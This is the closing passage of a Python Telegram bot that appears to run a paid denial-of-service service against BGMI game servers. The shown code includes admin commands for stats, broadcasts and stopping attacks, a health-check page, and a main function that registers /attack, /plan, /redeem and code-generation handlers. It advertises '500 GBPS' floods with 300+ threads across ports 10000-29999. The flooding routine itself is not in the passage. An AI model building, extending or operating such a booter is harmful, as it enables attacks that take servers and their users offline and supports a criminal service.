    msg += f"✅ Active Plans: `{au}`\n"
    msg += f"🚫 Banned: `{bc}`\n"
    msg += f"📦 Total Attacks: `{ta}`\n"
    msg += f"🔑 Available Codes: `{ac}`\n"
    msg += f"⚡ Running Attacks: `{running}`\n\n"
    msg += f"*PLANS DISTRIBUTION:*\n"
    for p,c in ps:
        msg += f"• *{p.upper()}*: `{c}` users\n"
    msg += f"\n*CONFIG:*\n"
    msg += f"⚡ Power: `500 GBPS`\n"
    msg += f"🧵 Threads: `300+`\n"
    msg += f"🎯 Ports: `{len(BGMI_PORTS)}` (10000-29999)\n"
    msg += f"⏱ Max: `{MAX_DURATION}s` | CD: `{COOLDOWN}s`"
    
    await update.message.reply_text(msg, parse_mode='Markdown')

async def admin_broadcast(update, context):
    if update.effective_user.id != ADMIN_ID: return
    if not context.args:
        await update.message.reply_text("❌ /broadcast MSG", parse_mode='Markdown')
        return
    msg = ' '.join(context.args)
    users = get_users()
    s, f = 0, 0
    for uid,_,_,_,_ in users:
        try:
            await context.bot.send_message(uid,
                f"📢 *ADMIN BROADCAST*\n\n{msg}\n\n— {ADMIN_USER}",
                parse_mode='Markdown')
            s += 1
        except:
            f += 1
    await update.message.reply_text(
        f"📊 *BROADCAST RESULT*\n✅ Sent: `{s}`\n❌ Failed: `{f}`",
        parse_mode='Markdown')

async def admin_stopall(update, context):
    if update.effective_user.id != ADMIN_ID: return
    c = 0
    for uid in list(stop_events.keys()):
        if halt(uid):
            c += 1
    await update.message.reply_text(f"🛑 Stopped `{c}` attacks", parse_mode='Markdown')

# ===== FLASK HEALTH CHECK =====
appf = Flask(__name__)
@appf.route('/')
def hc():
    ac = sum(1 for v in attacks.values() if v is not None)
    return f"✅ BGMI v12 PREMIUM | Active: {ac} | Ports: {len(BGMI_PORTS)} | Range: 10000-29999 | Power: 500 GBPS"

def run_web():
    appf.run(host='0.0.0.0', port=8080, debug=False, use_reloader=False)

# ===== MAIN =====
def main():
    init_db()
    threading.Thread(target=run_web, daemon=True).start()
    
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("attack", cmd_attack))
    app.add_handler(CommandHandler("stop", cmd_stop))
    app.add_handler(CommandHandler("plan", cmd_plan))
    app.add_handler(CommandHandler("myplan", cmd_myplan))
    app.add_handler(CommandHandler("myinfo", cmd_myinfo))
    app.add_handler(CommandHandler("help", cmd_help))
    app.add_handler(CommandHandler("redeem", cmd_redeem))
    app.add_handler(CommandHandler("status", cmd_status))
    app.add_handler(CommandHandler("add", admin_add))
    app.add_handler(CommandHandler("remove", admin_remove))
    app.add_handler(CommandHandler("ban", admin_ban))
    app.add_handler(CommandHandler("unban", admin_unban))
    app.add_handler(CommandHandler("gencode", admin_gencode))
    app.add_handler(CommandHandler("users", admin_users))
    app.add_handler(CommandHandler("running", admin_running))
    app.add_handler(CommandHandler("stats", admin_stats))
    app.add_handler(CommandHandler("broadcast", admin_broadcast))
    app.add_handler(CommandHandler("stopall", admin_stopall))
    app.add_handler(CallbackQueryHandler(btn_cb))
    
    print(f"\n{'='*60}")
    print(f"🤖 BGMI v12 PREMIUM ONLINE")
    print(f"👑 Admin: {ADMIN_ID}")
    print(f"🎯 Ports: {len(BGMI_PORTS)} (10000-29999 ONLY)")
    print(f"🧵 Threads: 300+ per attack")
    print(f"⚡ Power: 500 GBPS")
    print(f"✅ Internet: NO SLOWDOWN")
    print(f"{'='*60}")
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()